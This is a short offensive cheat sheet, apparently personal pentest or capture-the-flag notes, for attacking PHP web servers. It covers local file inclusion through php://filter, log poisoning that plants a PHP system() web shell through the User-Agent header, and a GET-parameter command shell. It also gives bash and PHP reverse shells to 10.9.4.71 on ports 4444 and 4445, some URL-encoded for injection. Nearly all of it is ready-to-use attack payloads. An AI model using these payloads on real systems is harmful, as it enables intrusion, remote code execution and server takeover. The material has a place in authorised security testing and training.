# PHP Utils

View file source, using base64. 
https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/

```
php://filter/convert.base64-encode/resource=FILE_NAME
```

```
base64 FILE_NAME_SAVED -d 
```

**Log Poisoning**
Always view your logs!

https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet

Log File Location
```
/var/log/apache2/access.log
```

Set User-Agent to custom payload 
```
-H "User-Agent: <?php system(\$_GET['c']); ?>"
```

**RCE Payload** 
A simple get param that can be injected into a PHP runtime, with an accompanying bash reverse shell. 

```
<?php system($_GET['cmd']); ?>
```

*Inline*
```
bash -i >& /dev/tcp/10.9.4.71/4445 0>&1
bash+-i+>%26+/dev/tcp/10.9.4.71/4444+0>%261
``````

*Script File*
```
#!/bin/bash
bash -i >& /dev/tcp/10.9.4.71/4445 0>&1
```

**Create a PHP shell from a bash cmd.**

```
echo '<?php $sock=fsockopen("10.9.4.71",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>' > shell.php
```

```
echo+'<%3fphp+$sock%3dfsockopen("10.9.4.71",4444)%3b$proc%3dproc_open("/bin/sh+-i",+array(0%3d>$sock,+1%3d>$sock,+2%3d>$sock),$pipes)%3b+%3f>'+>+shell.php
```